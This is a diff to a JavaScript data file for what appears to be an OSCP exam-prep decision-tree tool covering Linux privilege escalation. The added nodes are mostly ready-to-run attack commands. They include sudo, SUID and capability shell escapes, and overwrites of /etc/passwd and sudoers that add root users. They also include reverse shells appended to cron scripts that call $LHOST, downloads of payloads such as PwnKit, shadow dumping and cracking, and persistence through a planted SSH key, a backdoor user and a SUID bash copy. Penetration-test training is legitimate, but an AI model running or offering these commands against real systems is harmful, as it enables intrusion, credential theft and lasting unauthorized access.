+sudo tcpdump -ln -i lo -w /dev/null -W 1 -G 1 -z $TF -Z root
+
+# env
+sudo env /bin/bash
+
+# tee — write to root files
+echo "user ALL=(ALL) NOPASSWD: ALL" | sudo tee -a /etc/sudoers
+
+# ── APPARMOR — IF EXPLOIT BLOCKED ────────────────────
+# Module 18.4.2: AppArmor can block sudo exploits
+cat /var/log/syslog | grep "DENIED"
+# apparmor="DENIED" = AppArmor blocked it
+# Check status:
+sudo aa-status 2>/dev/null
+
+# ── SUDO WITH ENV VARS ────────────────────────────────
+# If env_keep is set (LD_PRELOAD etc)
+sudo -l | grep env_keep
+# LD_PRELOAD trick:
+# cat > /tmp/pe.c << EOF
+# #include <stdio.h>
+# #include <stdlib.h>
+# void _init() { setuid(0); system("/bin/bash"); }
+# EOF
+gcc -shared -fPIC -nostartfiles -o /tmp/pe.so /tmp/pe.c
+sudo LD_PRELOAD=/tmp/pe.so <allowed_command>
+
+# ── GCC (sudo) ────────────────────────────────────────
+# sudo -l shows: /usr/bin/gcc
+sudo gcc -wrapper /bin/bash,-s -o /dev/null /dev/null
+# instant root shell
+
+# Alternative — compile setuid shell:
+echo 'int main(){setuid(0);setgid(0);system("/bin/bash");}' > /tmp/sh.c
+sudo gcc /tmp/sh.c -o /tmp/sh
+/tmp/sh
+
+# ── SUDO VERSION EXPLOIT ──────────────────────────────
+# Baron Samedit CVE-2021-3156 (sudo < 1.9.5p2)
+sudo --version
+sudoedit -s / 2>&1 | grep -i "usage"
+# If "usage" = vulnerable`,
+    warn: "If tcpdump or other exploit is blocked, check /var/log/syslog for AppArmor DENIED. AppArmor profiles restrict what processes can do even with sudo. Try a different command from sudo -l.",
     choices: [
-      { label: "GTFOBins worked — ROOT!", next: "got_root_linux" },
-      { label: "Nothing useful — check SUID", next: "suid_check" },
+      { label: "Got root shell via sudo", next: "got_root_linux" },
+      { label: "sudo blocked by AppArmor — try another cmd", next: "linux_post_exploit" },
+      { label: "Back to full enum", next: "linux_post_exploit" },
     ],
   },
+
 
   suid_check: {
     phase: "LINUX",
-    title: "SUID Binaries",
-    body: "Find every SUID binary and check each one on GTFOBins. Custom SUID binaries with path injection or buffer overflows are common OSCP vectors.",
-    cmd: `find / -perm -u=s -type f 2>/dev/null
+    title: "SUID / Capabilities Exploitation",
+    body: "SUID binaries run as their owner (often root). eUID=0 even if uid shows your user. cp SUID is clean — overwrite /etc/sudoers directly. Always check GTFOBins with SUID filter.",
+    cmd: `# ── FIND SUID BINARIES ───────────────────────────────
+find / -perm -u=s -type f 2>/dev/null
 find / -perm -g=s -type f 2>/dev/null
+# Reference: https://gtfobins.github.io (enable SUID filter)
 
-# Check each on https://gtfobins.github.io (SUID filter)
+# ── CP (SUID) — CLEANEST METHOD ──────────────────────
+# cp runs as root, can overwrite any file
+# Method 1: overwrite /etc/sudoers (smoothest)
+echo "joe ALL=(ALL) NOPASSWD: ALL" > /tmp/sudoers
+cp /tmp/sudoers /etc/sudoers
+sudo su
+# or: sudo bash
 
-# Common GTFOBins SUID:
-# find    → ./find . -exec /bin/sh -p \\; -quit
-# bash    → ./bash -p
-# vim     → ./vim -c ':py import os; os.execl("/bin/sh","sh","-p")'
-# python  → ./python -c 'import os; os.execl("/bin/sh","sh","-p")'
-# cp      → cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash; /tmp/rootbash -p
+# Method 2: add root user to /etc/passwd
+cp /etc/passwd /tmp/passwd.bak
+openssl passwd w00t        # → Fdzt.eqJQ4s0g
+echo "jimi421:Fdzt.eqJQ4s0g:0:0:root:/root:/bin/bash" >> /tmp/passwd.bak
+cp /tmp/passwd.bak /etc/passwd
+su jimi421   # password: w00t
 
-# Custom SUID binary — check for path injection
-strings /path/to/suid_binary | grep -v "/"   # unqualified commands?
-ltrace /path/to/suid_binary                  # library calls
-strace /path/to/suid_binary                  # syscalls`,
-    warn: null,
+# Method 3: read /etc/shadow
+cp /etc/shadow /tmp/shadow.txt
+cat /tmp/shadow.txt
+# Then crack with hashcat -m 1800
+
+# ── FIND (SUID) ───────────────────────────────────────
+find / -name . -exec /bin/bash -p \; -quit
+find /tmp -exec /bin/bash -p \; -quit
+# -p preserves effective UID = runs as root
+
+# ── BASH (SUID) ───────────────────────────────────────
+/bin/bash -p
+# bash-5.0# euid=0(root)
+
+# ── PYTHON / PYTHON3 (SUID) ──────────────────────────
+python3 -c 'import os; os.execl("/bin/sh","sh","-p")'
+python -c 'import os; os.execl("/bin/sh","sh","-p")'
+
+# ── VIM (SUID) ────────────────────────────────────────
+vim -c ':py3 import os; os.execl("/bin/sh","sh","-p")'
+vim -c ':!/bin/bash -p'
+# Or from inside vim: :shell
+
+# ── LESS / MORE (SUID) ───────────────────────────────
+less /etc/passwd
+# Inside less: !/bin/bash -p
+
+# ── NMAP (SUID — older versions) ─────────────────────
+nmap --interactive
+# nmap> !sh
+
+# ── PERL (SUID) ───────────────────────────────────────
+perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh";'
+
+# ── AWK (SUID) ────────────────────────────────────────
+awk 'BEGIN {system("/bin/bash -p")}'
+
+# ── NANO (SUID) ───────────────────────────────────────
+# Open any file, then:
+# Ctrl+R Ctrl+X
+# reset; bash -p 1>&0 2>&0
+
+# ── XXDE / TCLSH / RUBY (SUID) ───────────────────────
+# xxd — read shadow
+xxd /etc/shadow | xxd -r
+# tclsh
+tclsh <<< 'exec /bin/bash -p'
+# ruby
+ruby -e 'exec "/bin/bash -p"'
+
+# ── DD (SUID) — read/write any file ──────────────────
+# Read shadow
+dd if=/etc/shadow 2>/dev/null
+# Overwrite passwd
+echo "r00t::0:0:root:/root:/bin/bash" | dd of=/etc/passwd conv=append oflag=append
+
+# ── TAR (SUID) ────────────────────────────────────────
+tar -czf /tmp/shadow.tar.gz /etc/shadow
+tar -xzf /tmp/shadow.tar.gz -C /tmp
+cat /tmp/etc/shadow
+
+# ── CAPABILITIES (getcap) ─────────────────────────────
+getcap -r / 2>/dev/null
+# cap_setuid+ep  = setuid to root
+# cap_net_raw+ep = raw packet capture
+# cap_dac_read_search = bypass read permission checks
+
+# perl cap_setuid
+perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh";'
+# python3 cap_setuid
+python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
+# node cap_setuid
+node -e 'process.setuid(0); require("child_process").spawn("/bin/sh",[],{stdio:"inherit"})'
+
+# ── VERIFY ────────────────────────────────────────────
+id
+# uid=1000(joe) gid=1000(joe) euid=0(root) = root even though uid shows joe
+whoami`,
+    warn: "cp SUID → overwrite /etc/sudoers is the smoothest path — no shell needed, just sudo su after. Always use -p flag with bash/sh to preserve effective UID, otherwise it resets to your real UID.",
     choices: [
-      { label: "GTFOBins SUID exploit worked — ROOT!", next: "got_root_linux" },
-      { label: "Custom binary — path hijack worked", next: "got_root_linux" },
-      { label: "Nothing — check cron", next: "cron_check" },
+      { label: "Got root — grab proof", next: "got_root_linux" },
+      { label: "Got shadow — crack hashes", next: "hashcrack" },
+      { label: "Back to full enum", next: "linux_post_exploit" },
     ],
   },
 
+
   cron_check: {
     phase: "LINUX",
-    title: "Cron Jobs",
-    body: "Scripts run by root on a schedule that you can write to are privesc gold. Use pspy to catch jobs that don't appear in crontab.",
-    cmd: `cat /etc/crontab
+    title: "Cron Job Exploitation",
+    body: "Module 18.3.1: find scripts run by root cron that you can write to. Append a reverse shell — within a minute you have root. Check /var/log/syslog for what's actually running.",
+    cmd: `# ── FIND CRON JOBS ────────────────────────────────────
+cat /etc/crontab
 ls -la /etc/cron*
+cat /etc/cron.d/*
 crontab -l
+sudo crontab -l   # root jobs if sudo allows
 
-# pspy — watch for root processes (no root needed)
-/tmp/pspy64
+# ── CHECK SYSLOG FOR RUNNING CRON JOBS ───────────────
+# Most reliable way to see what actually runs and when
+grep "CRON" /var/log/syslog
+grep "CRON" /var/log/syslog | tail -20
+# Look for: (root) CMD (/path/to/script.sh)
 
-# If you find a writable script called by root:
-echo 'chmod +s /bin/bash' >> /path/to/script.sh
-# Wait for execution, then:
+# ── PSPY — WATCH WITHOUT ROOT ────────────────────────
+# Download: github.com/DominicBreuker/pspy
+wget http://$LHOST/pspy64 -O /tmp/pspy64
+chmod +x /tmp/pspy64 && /tmp/pspy64
+# Watch for UID=0 processes running scripts
+
+# ── CHECK SCRIPT PERMISSIONS ──────────────────────────
+# Once you find a script run by root:
+ls -la /home/joe/.scripts/user_backups.sh
+# -rwxrwxrw- = world writable = exploitable
+cat /home/joe/.scripts/user_backups.sh
+
+# ── EXPLOIT — APPEND REVERSE SHELL ───────────────────
+# Method 1: reverse shell
+echo "" >> /path/to/script.sh
+echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $LHOST 443 >/tmp/f" >> /path/to/script.sh
+
+# Method 2: add SUID to bash
+echo "chmod +s /bin/bash" >> /path/to/script.sh
+# Wait for execution then:
 /bin/bash -p
+# bash-5.0# id — euid=0(root)
 
-# Or add SUID to copy of bash
-echo 'cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash' >> /path/to/script.sh
+# Method 3: copy bash with SUID
+echo "cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash" >> /path/to/script.sh
+# Wait then:
+/tmp/rootbash -p
 
-# PATH injection in cron:
-# If cron calls unqualified binary + you control PATH dir:
-echo '#!/bin/bash' > /tmp/curl
-echo 'chmod +s /bin/bash' >> /tmp/curl
-chmod +x /tmp/curl
-export PATH=/tmp:$PATH`,
-    warn: null,
+# ── LISTENER ON KALI ─────────────────────────────────
+nc -nlvp 443
+# Wait up to 1 minute for cron to fire
+
+# ── PATH INJECTION IN CRON ────────────────────────────
+# If crontab has PATH= and calls script without full path:
+# PATH=/home/joe:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
+# * * * * * cleanup.sh
+# Create malicious cleanup.sh in /home/joe:
+echo '#!/bin/bash
+bash -i >& /dev/tcp/$LHOST/443 0>&1' > /home/joe/cleanup.sh
+chmod +x /home/joe/cleanup.sh`,
+    warn: "Always use >> to APPEND to the cron script, never > which overwrites it. Overwriting may break the script and alert the admin. Check with cat after appending.",
     choices: [
-      { label: "Cron exploitation worked — ROOT!", next: "got_root_linux" },
-      { label: "No writable cron targets — try capabilities", next: "linux_manual_enum" },
+      { label: "Got root shell from cron", next: "got_root_linux" },
+      { label: "Script not writable — try PATH injection", next: "linux_privesc_extra" },
+      { label: "Nothing writable — watch with pspy", next: "linpeas" },
+      { label: "Back to full enum", next: "linux_post_exploit" },
+    ],
+  },
+
+
+  passwd_shadow: {
+    phase: "LINUX",
+    title: "/etc/passwd & /etc/shadow Abuse",
+    body: "Writable /etc/passwd = instant root. Readable /etc/shadow = crack offline. Two of the most common Linux privesc vectors on OSCP.",
+    cmd: `# ── CHECK PERMISSIONS ────────────────────────────────
+ls -la /etc/passwd /etc/shadow
+# /etc/passwd  -rw-rw-rw-  = world writable = instant root
+# /etc/shadow  readable    = grab hashes and crack
+
+# ── WRITABLE /ETC/PASSWD — ADD ROOT USER ─────────────
+# Step 1: generate hash
+openssl passwd w00t
+# → Fdzt.eqJQ4s0g
+
+# Step 2: append root-level user
+echo "jimi421:Fdzt.eqJQ4s0g:0:0:root:/root:/bin/bash" >> /etc/passwd
+
+# Step 3: switch user
+su jimi421    # password: w00t
+id            # uid=0(root)
+
+# Blank password variant (no password needed):
+echo "r00t::0:0:root:/root:/bin/bash" >> /etc/passwd
+su r00t       # just press Enter
+
+# ── WRITABLE /ETC/PASSWD — REMOVE ROOT PASSWORD ──────
+# Copy, edit, replace
+cp /etc/passwd /tmp/passwd.bak
+sed 's/root:x:/root::/' /etc/passwd > /tmp/passwd_new
+cp /tmp/passwd_new /etc/passwd
+su root       # blank password now works
+
+# ── READABLE /ETC/SHADOW — CRACK OFFLINE ─────────────
+cat /etc/shadow
+# Copy both files to Kali:
+scp user@$ip:/etc/shadow .
+scp user@$ip:/etc/passwd .
+
+# Unshadow then crack
+unshadow passwd shadow > unshadowed.txt
+hashcat -m 1800 unshadowed.txt /usr/share/wordlists/rockyou.txt
+hashcat -m 1800 unshadowed.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule
+john --wordlist=/usr/share/wordlists/rockyou.txt unshadowed.txt
+
+# Hash format reference:
+# $1$  = MD5          hashcat -m 500
+# $5$  = SHA-256      hashcat -m 7400
+# $6$  = SHA-512      hashcat -m 1800  (most common on modern Linux)
+# $y$  = yescrypt     hashcat -m 7400
+
+# ── WRITABLE /ETC/SHADOW — REPLACE ROOT HASH ─────────
+# Generate hash
+openssl passwd -6 -salt xyz newpassword   # SHA-512
+python3 -c "import crypt; print(crypt.crypt('pass123', crypt.mksalt(crypt.METHOD_SHA512)))"
+# Replace root hash in shadow (use sed or vim)
+# Then: su root (password: newpassword)
+
+# ── /ETC/SUDOERS WRITABLE ────────────────────────────
+ls -la /etc/sudoers
+echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers
+sudo su`,
+    warn: "unix-privesc-check specifically flags world-writable /etc/passwd — run it if you haven't already. SHA-512 ($6$) hashes are slow to crack — use rules and targeted wordlists.",
+    choices: [
+      { label: "Got root via passwd", next: "got_root_linux" },
+      { label: "Got shadow hashes — crack them", next: "hashcrack" },
+      { label: "Back to enum", next: "linux_post_exploit" },
     ],
   },
 
   linux_manual_enum: {
     phase: "LINUX",
-    title: "Deep Manual Enumeration",
-    body: "LinPEAS missed something. Go manual on capabilities, NFS, writable files, interesting env vars, stored creds in configs.",
-    cmd: `getcap -r / 2>/dev/null
-# python3 cap_setuid → python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
+    title: "Linux Manual Enum — Capabilities, NFS, Writable Files",
+    body: "Techniques automated tools often miss — capabilities, NFS no_root_squash, writable files owned by root, recently modified files.",
+    cmd: `# ── CAPABILITIES ─────────────────────────────────────
+getcap -r / 2>/dev/null
+# cap_setuid+ep       = setuid to root
+# cap_dac_read_search = bypass read permission
+# cap_net_raw+ep      = raw packet capture
 
-cat /etc/exports && showmount -e $ip
+# Exploit cap_setuid — perl
+perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh";'
+# Exploit cap_setuid — python3
+python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
+# Exploit cap_setuid — node
+node -e 'process.setuid(0); require("child_process").spawn("/bin/sh",[],{stdio:"inherit"})'
 
-ls -la /etc/passwd
-openssl passwd -1 -salt x pass123
-echo 'r00t:$1$xHASH:0:0:root:/root:/bin/bash' >> /etc/passwd
+# cap_dac_read_search — tar to read shadow
+tar -czf /tmp/s.tar.gz /etc/shadow && tar -xzf /tmp/s.tar.gz -C /tmp && cat /tmp/etc/shadow
 
-find / -name "id_rsa" 2>/dev/null
-cat ~/.bash_history
-find / -name "*.conf" | xargs grep -i "password" 2>/dev/null
-find / -mmin -10 -type f 2>/dev/null`,
+# ── NFS NO_ROOT_SQUASH ────────────────────────────────
+cat /etc/exports
+showmount -e $ip
+# If no_root_squash present on a share:
+# On Kali — mount and plant SUID binary:
+sudo mount -t nfs $ip:/share /mnt/nfs
+cp /bin/bash /mnt/nfs/rootbash
+chmod +s /mnt/nfs/rootbash
+# On target:
+/share/rootbash -p
+# Or mount on Kali and add root user to passwd
+
+# ── WRITABLE FILES OWNED BY ROOT ─────────────────────
+# Scripts run by root cron that you can write to
+find / -writable -type f 2>/dev/null | grep -v proc | grep -v sys | grep -v "/dev/" | grep -v run
+ls -la /etc/passwd /etc/shadow /etc/sudoers /etc/crontab /etc/hosts
+
+# ── RECENTLY MODIFIED FILES ───────────────────────────
+find / -mmin -10 -type f 2>/dev/null | grep -v proc | grep -v sys
+find /etc -mtime -1 2>/dev/null
+find / -newer /etc/passwd -type f 2>/dev/null | grep -v proc | grep -v sys
+
+# ── LOG FILES — CREDENTIAL HUNTING ───────────────────
+# adm group or root readable
+cat /var/log/auth.log 2>/dev/null | grep -i "pass\|accept\|fail" | tail -30
+cat /var/log/apache2/access.log 2>/dev/null | grep -i "pass"
+cat /var/log/apache2/error.log 2>/dev/null | grep -i "pass"
+grep -ri "password" /var/log/ 2>/dev/null | grep -v "^Binary" | head -20
+
+# ── /VAR/MAIL — CREDENTIAL HUNTING ───────────────────
+ls -la /var/mail/ /var/spool/mail/ 2>/dev/null
+cat /var/mail/* 2>/dev/null
+
+# ── NOOWNER FILES ─────────────────────────────────────
+find / -nouser -o -nogroup 2>/dev/null | grep -v proc | grep -v sys
+
+# ── UNMOUNTED DRIVES ──────────────────────────────────
+lsblk
+cat /etc/fstab
+# Partitions with no MOUNTPOINT = unmounted = may contain creds`,
     warn: null,
     choices: [
-      { label: "Capabilities exploit worked — ROOT!", next: "got_root_linux" },
-      { label: "NFS no_root_squash — SUID exploit", next: "got_root_linux" },
-      { label: "Writable /etc/passwd — added root user", next: "got_root_linux" },
-      { label: "Group membership (docker/lxd/disk)", next: "linux_privesc_extra" },
-      { label: "Still nothing — kernel exploit", next: "kernel_exploit" },
+      { label: "Capability found — GTFOBins", next: "suid_check" },
+      { label: "NFS no_root_squash", next: "got_root_linux" },
+      { label: "Writable cron script", next: "cron_check" },
+      { label: "Found creds in logs/mail", next: "linux_password_hunt" },
+      { label: "Back to main enum", next: "linux_post_exploit" },
     ],
   },
+
+
 
   kernel_exploit: {
     phase: "LINUX",
-    title: "Kernel Exploit",
-    body: "Last resort — kernel exploits can crash the machine. Compile carefully, test, have a revert plan. DirtyCow is classic but notoriously unstable.",
-    cmd: `uname -r
+    title: "Kernel Exploit (Linux)",
+    body: "Module 18.4.3: match kernel version + distro to a known CVE. Compile on target if gcc available — avoids cross-compilation issues. Kernel exploits can crash the system — test on a clone first.",
+    cmd: `# ── GATHER TARGET INFO ───────────────────────────────
+uname -r
+uname -a
+cat /etc/issue
 cat /etc/os-release
+arch
 
+# ── SEARCHSPLOIT ON KALI ──────────────────────────────
+searchsploit "linux kernel Ubuntu 16 Local Privilege Escalation" | grep "4." | grep -v "< 4.4.0" | grep -v "4.8"
 searchsploit linux kernel $(uname -r | cut -d'-' -f1)
-searchsploit linux privilege escalation
+searchsploit linux privilege escalation | grep -i "local"
 
-# Common exploits by kernel:
-# DirtyCow     CVE-2016-5195   (2.6.22 – 4.8.3)
-# overlayfs    CVE-2015-1328   (Ubuntu 12.04/14.04/15.10)
-# Baron Samedit CVE-2021-3156  (sudo < 1.9.5p2)
-# Dirty Pipe   CVE-2022-0847   (5.8 – 5.16.11)
+# ── WES-NG — MISSING PATCHES ──────────────────────────
+# More reliable than searchsploit for kernel vulns
+# On target:
+uname -a > /tmp/sysinfo.txt
+cat /etc/os-release >> /tmp/sysinfo.txt
+# Transfer to Kali then:
+python3 wes.py sysinfo.txt
+python3 wes.py sysinfo.txt --impact "Privilege Escalation"
 
-# Always compile on same arch as target
+# ── COMMON KERNEL CVES ───────────────────────────────
+# DirtyCow     CVE-2016-5195   kernel 2.6.22 to 4.8.3
+# Overlayfs    CVE-2015-1328   Ubuntu 12.04/14.04/15.10
+# Baron Samedit CVE-2021-3156  sudo < 1.9.5p2
+# Dirty Pipe   CVE-2022-0847   kernel 5.8 to 5.16.11
+# PwnKit       CVE-2021-4034   pkexec (all Linux distros)
+
+# ── COMPILE ON TARGET (preferred — avoids cross-compile) ─
+# Transfer source to target first
+scp exploit.c user@$ip:/tmp/
+# On target:
 gcc exploit.c -o exploit
-./exploit`,
-    warn: "Kernel exploits can destabilize the machine. Use as last resort. Have revert ready.",
+file exploit   # verify ELF 64-bit if target is x64
+./exploit
+
+# ── COMPILE ON KALI (cross-compile for target arch) ──
+# x64 target:
+gcc -m64 exploit.c -o exploit
+# x86 target:
+gcc -m32 exploit.c -o exploit
+# Static (avoids library version issues):
+gcc -static exploit.c -o exploit
+
+# ── READ EXPLOIT COMPILE INSTRUCTIONS FIRST ──────────
+# Module 18.4.3: always read the first 20 lines
+head exploit.c -n 20
+# Follow exact compile instructions in the comments
+
+# ── LINUX-EXPLOIT-SUGGESTER ─────────────────────────
+# Specifically for kernel CVE matching — different from LinPEAS
+# On Kali: wget https://github.com/mzet-/linux-exploit-suggester/raw/master/linux-exploit-suggester.sh
+wget http://$LHOST/les.sh -O /tmp/les.sh
+chmod +x /tmp/les.sh && /tmp/les.sh
+# Outputs CVEs ranked by probability with compile instructions
+
+# ── PWNKIT (CVE-2021-4034) — VERY RELIABLE ────────────
+# Works on all major distros regardless of kernel version
+# Check if pkexec exists:
+which pkexec
+ls -la /usr/bin/pkexec   # should have SUID
+# Exploit: github.com/berdav/CVE-2021-4034
+wget http://$LHOST/pwnkit -O /tmp/pw
+chmod +x /tmp/pw && /tmp/pw`,
+    warn: "Kernel exploits can crash the system — always test on a clone first. Match BOTH kernel version AND distro. Mismatched exploit = kernel panic = system down = angry client.",
     choices: [
-      { label: "Kernel exploit worked — ROOT!", next: "got_root_linux" },
-      { label: "Machine crashed — reverted and re-enumerate", next: "linux_post_exploit" },
+      { label: "Got root via kernel exploit", next: "got_root_linux" },
+      { label: "No matching exploit — try sudo/SUID", next: "sudo_check" },
     ],
   },
+
 
   got_root_linux: {
     phase: "LINUX",
-    title: "ROOT — Linux",
-    body: "You're root. Get the proof screenshot right: whoami + id + hostname + ip + cat proof.txt — all visible in one screenshot.",
-    cmd: `id && whoami && hostname
+    title: "ROOT — Linux Post-Exploitation",
+    body: "You're root. Screenshot first, then dump everything before the session dies. Same cyclical rule — new box = check for pivots.",
+    cmd: `# ── STEP 1: PROOF SCREENSHOT ─────────────────────────
+id && whoami && hostname
 ip a
 cat /root/proof.txt
+cat /root/local.txt 2>/dev/null
+# Screenshot must show: uid=0(root) + hostname + IP + flag — all in one frame
 
-# Screenshot checklist:
-# ✅ id showing uid=0(root)
-# ✅ hostname visible
-# ✅ IP visible (ip a or ifconfig)
-# ✅ cat /root/proof.txt showing hash
-# ✅ All in ONE screenshot`,
-    warn: null,
+# ── STEP 2: DUMP /ETC/SHADOW ─────────────────────────
+cat /etc/shadow
+cat /etc/passwd
+
+# Unshadow and crack on Kali
+# cp both files to Kali then:
+# unshadow passwd shadow > unshadowed.txt
+# hashcat -m 1800 unshadowed.txt /usr/share/wordlists/rockyou.txt
+# john --wordlist=/usr/share/wordlists/rockyou.txt unshadowed.txt
+
+# ── STEP 3: PLANT SSH KEY (persistence) ───────────────
+# On Kali: ssh-keygen -t rsa -f /tmp/root_key
+# Copy public key to target:
+mkdir -p /root/.ssh
+echo "ssh-rsa AAAA...YOURPUBKEY..." >> /root/.ssh/authorized_keys
+chmod 600 /root/.ssh/authorized_keys
+# Login: ssh -i /tmp/root_key root@$ip
+
+# ── STEP 4: ADD BACKDOOR USER ─────────────────────────
+useradd -m -s /bin/bash backdoor
+echo "backdoor:pass123" | chpasswd
+usermod -aG sudo backdoor
+# Or directly in passwd:
+echo "backdoor:$(openssl passwd w00t):0:0:root:/root:/bin/bash" >> /etc/passwd
+
+# ── STEP 5: CHECK FOR PIVOTS ──────────────────────────
+ip a
+ip route
+arp -a
+cat /etc/hosts
+# Two NICs = pivot opportunity -> go to pivot_start
+
+# ── STEP 6: LOOT ──────────────────────────────────────
+# SSH keys
+find / -name "id_rsa" 2>/dev/null | xargs cat
+find / -name "*.pem" -o -name "*.key" 2>/dev/null
+cat /root/.ssh/id_rsa 2>/dev/null
+
+# Browser/app creds
+find / -name "*.kdbx" 2>/dev/null
+find / -name "*.db" -path "*/firefox/*" 2>/dev/null
+find / -name "*.db" -path "*/chromium/*" 2>/dev/null
+
+# History files
+cat /root/.bash_history
+cat /root/.mysql_history 2>/dev/null
+
+# Config files
+find /etc -name "*.conf" | xargs grep -il "password" 2>/dev/null
+cat /etc/mysql/my.cnf 2>/dev/null
+cat /var/www/html/config.php 2>/dev/null
+
+# ── STEP 7: LINUX PERSISTENCE ─────────────────────────
+# Cron backdoor
+# echo "* * * * * root bash -i >& /dev/tcp/LHOST/4444 0>&1" >> /etc/crontab
+
+# SUID bash copy
+cp /bin/bash /tmp/.bash
+chmod +s /tmp/.bash
+/tmp/.bash -p   # regain root any time
+
+# Sudoers backdoor
+echo "www-data ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers`,
+    warn: "Always screenshot BEFORE doing anything else — boxes get reverted. Plant the SSH key second so you can get back in if the shell dies.",
     choices: [
-      { label: "New subnet in ip route — pivot!", next: "pivot_start" },
-      { label: "Back to start — next machine", next: "start" },
+      { label: "Second NIC found — pivot", next: "pivot_start" },
+      { label: "Got hashes — crack them", next: "hashcrack" },
+      { label: "Next machine", next: "start" },
     ],
   },
+
 
   // ==========================================
   //  WINDOWS PRIVESC
@@ -7307,66 +8212,87 @@ xfreerdp /u:USER /p:PASS /v:$ip /cert-ignore
 
   linux_password_hunt: {
     phase: "LINUX",
-    title: "Linux Password Hunting",
-    body: "Credentials live in config files, bash history, environment variables, and scripts. This is one of the most reliable Linux privesc paths and most people skip it. Search everything.",
-    cmd: `# -- BASH HISTORY -------------------------
+    title: "Linux Credential Hunting",
+    body: "Module 18.2: low hanging fruit first. Bash history, env vars, config files, service footprints. watch -n 1 on ps for cleartext creds in process args.",
+    cmd: `# ── BASH HISTORY ─────────────────────────────────────
 cat ~/.bash_history
 cat /home/*/.bash_history 2>/dev/null
-cat /root/.bash_history 2>/dev/null
+history
 # Look for: ssh commands, mysql -p, passwords in commands
 
-# -- ENVIRONMENT VARIABLES -----------------
-env | grep -i "pass\|key\|secret\|token\|api\|db"
-cat /proc/*/environ 2>/dev/null | tr '\0' '\n' | grep -i pass
+# ── ENVIRONMENT VARIABLES ─────────────────────────────
+env
+cat ~/.bashrc
+cat ~/.bash_profile
+cat /etc/environment
+env | grep -i "pass\|key\|secret\|token\|api\|db\|cred"
+# Module 18.2.1 example: SCRIPT_CREDENTIALS=lab in .bashrc
+# Try it directly: su - root (use found password)
 
-# -- CONFIG FILES --------------------------
-find / -name "*.conf" -o -name "*.config" -o -name "*.cfg" 2>/dev/null |   xargs grep -li "password\|passwd\|secret" 2>/dev/null
+# ── WATCH PROCESSES FOR CLEARTEXT CREDS ─────────────
+# Module 18.2.2 — processes often leak creds in args
+watch -n 1 "ps aux | grep pass"
+watch -n 1 "ps aux | grep -i 'pass\|cred\|secret\|key'"
 
-find / -name "*.php" 2>/dev/null |   xargs grep -li "password\|db_pass\|mysql_pass" 2>/dev/null
+# ── TCPDUMP — SNIFF LOOPBACK FOR CREDS ───────────────
+# Requires sudo tcpdump permission
+sudo tcpdump -i lo -A | grep -i "pass\|user\|login"
+sudo tcpdump -i any -A -s 0 | grep -i "pass\|authorization"
 
-# Common locations
+# ── CONFIG FILES ──────────────────────────────────────
+find / -name "*.conf" -o -name "*.config" -o -name "*.cfg" 2>/dev/null | xargs grep -il "password" 2>/dev/null
+find / -name "wp-config.php" 2>/dev/null | xargs cat
+find / -name "*.php" 2>/dev/null | xargs grep -i "password" 2>/dev/null | head -20
+find / -name "database.yml" -o -name "settings.py" -o -name ".env" 2>/dev/null | xargs cat 2>/dev/null
 cat /var/www/html/config.php 2>/dev/null
-cat /var/www/html/.env 2>/dev/null
-cat /var/www/html/wp-config.php 2>/dev/null    # WordPress DB creds
-cat /etc/phpmyadmin/config-db.php 2>/dev/null
-cat /var/www/html/configuration.php 2>/dev/null # Joomla
-find /var/www -name '*.conf' -exec grep -i 'pass' {} +
+cat /var/www/html/wp-config.php 2>/dev/null
 
-# -- DATABASE CREDENTIAL FILES -------------
-find / -name "*.db" -o -name "*.sqlite" -o -name "*.sqlite3" 2>/dev/null
-cat /home/*/.my.cnf 2>/dev/null    # MySQL client creds
-cat /root/.my.cnf 2>/dev/null
+# ── SSH KEYS ──────────────────────────────────────────
+find / -name "id_rsa" 2>/dev/null
+find / -name "id_rsa.pub" 2>/dev/null
+find / -name "authorized_keys" 2>/dev/null
+cat ~/.ssh/id_rsa
+ls -la ~/.ssh/
 
-# -- SSH KEYS -----------------------------
-find / -name "id_rsa" -o -name "id_dsa" -o -name "id_ecdsa" 2>/dev/null
-find / -name "*.pem" -o -name "*.key" 2>/dev/null
-cat /home/*/.ssh/id_rsa 2>/dev/null
-cat /root/.ssh/id_rsa 2>/dev/null
-# Authorized keys — who can SSH in as this user?
-cat /home/*/.ssh/authorized_keys 2>/dev/null
+# ── /PROC ENVIRON — OTHER USERS ENV VARS ─────────────
+cat /proc/*/environ 2>/dev/null | tr '\0' '\n' | grep -i "pass\|key\|secret"
 
-# -- SCRIPTS AND CRON ----------------------
-find / -name "*.sh" 2>/dev/null | xargs grep -li "pass\|user\|cred" 2>/dev/null
-cat /etc/crontab
-ls -la /etc/cron*
-find /var/spool/cron -type f 2>/dev/null | xargs cat 2>/dev/null
+# ── RECENTLY MODIFIED FILES ───────────────────────────
+find / -mmin -10 -type f 2>/dev/null | grep -v proc | grep -v sys
+find / -mtime -1 -type f 2>/dev/null | grep -v proc
 
-# -- RECENTLY MODIFIED FILES ---------------
-find / -mmin -10 -type f 2>/dev/null | grep -v proc
-find / -mmin -60 -type f -name "*.txt" -o -name "*.conf" 2>/dev/null | grep -v proc
+# ── INTERESTING FILES ─────────────────────────────────
+find / -name "*.txt" -path "*/home/*" 2>/dev/null
+find / -name "*.bak" -o -name "*.backup" -o -name "*.old" 2>/dev/null
+find / -name "*.kdbx" 2>/dev/null   # KeePass
+ls -la /var/backups/ 2>/dev/null
 
-# -- QUICK GREP ALL PASSWORDS -------------
-grep -r "password" /var/www/ 2>/dev/null | grep -v "Binary\|\.swp"
-grep -r "password" /opt/ 2>/dev/null | grep -v Binary
-grep -rn "pass" /home/ 2>/dev/null | grep -v "Binary\|\.swp\|#"`,
